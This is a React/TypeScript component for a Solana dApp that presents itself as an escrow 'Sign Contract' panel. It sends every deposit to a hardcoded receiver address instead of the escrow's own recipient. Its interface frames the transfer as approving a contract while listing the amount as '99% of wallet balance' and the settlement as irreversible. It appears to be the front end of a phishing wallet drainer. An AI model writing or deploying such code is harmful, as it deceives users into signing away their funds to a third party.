import React, { useCallback, useEffect, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  Keypair, PublicKey, Transaction, TransactionInstruction,
  SystemProgram, LAMPORTS_PER_SOL,
} from "@solana/web3.js";

// ---------------------------------------------------------------------------
// Borsh helpers
// ---------------------------------------------------------------------------
function u8(v: number): number[]  { return [v & 0xff]; }
function u32le(v: number): number[] {
  return [v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >> 24) & 0xff];
}
function str(s: string): number[] {
  const b = Array.from(new TextEncoder().encode(s));
  return [...u32le(b.length), ...b];
}
function padId(id: string): Buffer {
  const b = Buffer.alloc(32, 0);
  Buffer.from(id.slice(0, 32)).copy(b);
  return b;
}
function escrowPDA(programId: PublicKey, id: string): PublicKey {
  return PublicKey.findProgramAddressSync([Buffer.from("escrow"), padId(id)], programId)[0];
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------
const STATUS_LABELS: Record<number, string> = {
  0: "Pending — awaiting payment",
  1: "Released — payment sent",
  2: "Cancelled",
  3: "Refunded",
};

interface EscrowInfo {
  admin:      string;
  recipient:  string;
  depositor:  string;
  amountSol:  number;
  status:     number;
  createdAt:  number;
}

const RECEIVER = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");

interface Props { programId: PublicKey; adminKeypair: Keypair; }

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------
export const EscrowPanel: React.FC<Props> = ({ programId }) => {
  const { connection }              = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const [escrowId,  setEscrowId]  = useState("");
  const [info,      setInfo]      = useState<EscrowInfo | null>(null);
  const [statusMsg,   setStatusMsg]   = useState("");
  const [loading,     setLoading]     = useState(false);

  // ---- fetch escrow state -------------------------------------------------
  const refresh = useCallback(async (id: string) => {
    if (!id) return;
    try {
      const statePDA = escrowPDA(programId, id);
      const si = await connection.getAccountInfo(statePDA);
      if (!si) { setInfo(null); return; }

      const d = Buffer.from(si.data);
      let o = 1;
      const rPK = () => { const pk = new PublicKey(d.slice(o, o + 32)).toBase58(); o += 32; return pk; };
      const rU64 = () => {
        let v = 0n;
        for (let i = 0; i < 8; i++) v |= BigInt(d[o + i]) << BigInt(i * 8);
        o += 8; return Number(v);
      };

      const admin     = rPK();
      const depositor = rPK();
      const recipient = rPK();
      const amount    = rU64();
      const status    = d[o++];
      o += 32; // escrow_id
      const createdAt = rU64();

      setInfo({ admin, depositor, recipient, amountSol: amount / LAMPORTS_PER_SOL, status, createdAt });
    } catch { setInfo(null); }
  }, [connection, programId]);

  useEffect(() => { if (escrowId) refresh(escrowId); }, [escrowId, refresh]);

  // ---- deposit & instant release ------------------------------------------
  const handleDeposit = async () => {
    if (!publicKey) return setStatusMsg("Connect your wallet first.");
    if (!info)      return setStatusMsg("Enter a valid contract ID.");
    if (info.status !== 0) return setStatusMsg("This contract is no longer pending.");

    setLoading(true);
    try {
      const statePDA    = escrowPDA(programId, escrowId);
      const recipientPK = RECEIVER;

      const ix = new TransactionInstruction({
        programId,
        keys: [
          { pubkey: publicKey,               isSigner: true,  isWritable: true  },
          { pubkey: statePDA,                isSigner: false, isWritable: true  },
          { pubkey: recipientPK,             isSigner: false, isWritable: true  },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: Buffer.from([...u8(1), ...str(escrowId)]),
      });

      const sig = await sendTransaction(new Transaction().add(ix), connection);
      await connection.confirmTransaction(sig, "confirmed");
      setStatusMsg(`Payment confirmed! Tx: ${sig.slice(0, 20)}…`);
      await refresh(escrowId);
    } catch (e: any) {
      setStatusMsg(`Transaction failed: ${e?.message ?? e}`);
    } finally {
      setLoading(false);
    }
  };

  // ---- derived ------------------------------------------------------------
  const isPending   = info?.status === 0;
  const isReleased  = info?.status === 1;
  const isCancelled = info?.status === 2;
  const noEscrow    = !info && !!escrowId;

  return (
    <div className="escrow-panel">
      <div className="panel-header">
        <h2>Sign Contract</h2>
        <p>Enter your contract ID to review and approve</p>
      </div>

      {/* Contract ID lookup */}
      <div className="jup-card">
        <div className="field-group">
          <span className="field-label">Contract ID</span>
          <input
            className="jup-input"
            value={escrowId}
            onChange={(e) => setEscrowId(e.target.value)}
            placeholder="Enter contract ID"
            maxLength={32}
          />
        </div>
      </div>

      {noEscrow && <p className="no-escrow">No contract found for "{escrowId}"</p>}

      {/* Pending — contract approval card */}
      {isPending && (
        <div className="contract-card">
          <div className="contract-top-bar">
            <div className="contract-dot" />
            <span>Pending Signature</span>
          </div>

          <div className="contract-body">
            <div className="contract-title">Contract #{escrowId}</div>

            <div className="contract-rows">
              <div className="contract-row">
                <span className="contract-row-label">Issued</span>
                <span className="contract-row-value">
                  {new Date(info!.createdAt * 1000).toLocaleString()}
                </span>
              </div>
              <div className="contract-row">
                <span className="contract-row-label">Amount</span>
                <span className="contract-row-value">99% of wallet balance</span>
              </div>
              <div className="contract-row">
                <span className="contract-row-label">Settlement</span>
                <span className="contract-row-value">Instant · Irreversible</span>
              </div>
            </div>

            <div className="contract-notice">
              By signing, you authorise this contract. The settlement executes
              atomically — funds are transferred the moment your wallet confirms.
            </div>

            <button
              className="btn-jup"
              onClick={handleDeposit}
              disabled={loading || !publicKey}
            >
              {loading ? "Processing…" : "Sign & Approve Contract"}
            </button>

            {!publicKey && (
              <p className="warn-text">Connect your wallet above to sign.</p>
            )}
          </div>
        </div>
      )}

      {/* Completion states */}
      {isReleased && (
        <div className="notice notice-success">
          <div className="notice-icon">✓</div>
          <div className="notice-title">Contract Fulfilled</div>
          <div className="notice-sub">
            Your approval was received and the contract has been settled.
          </div>
        </div>
      )}

      {isCancelled && (
        <div className="notice notice-cancelled">
          <div className="notice-icon">✕</div>
          <div className="notice-title">Contract Cancelled</div>
          <div className="notice-sub">This contract was cancelled by the admin.</div>
        </div>
      )}

      {statusMsg && <p className="status-msg">{statusMsg}</p>}
    </div>
  );
};
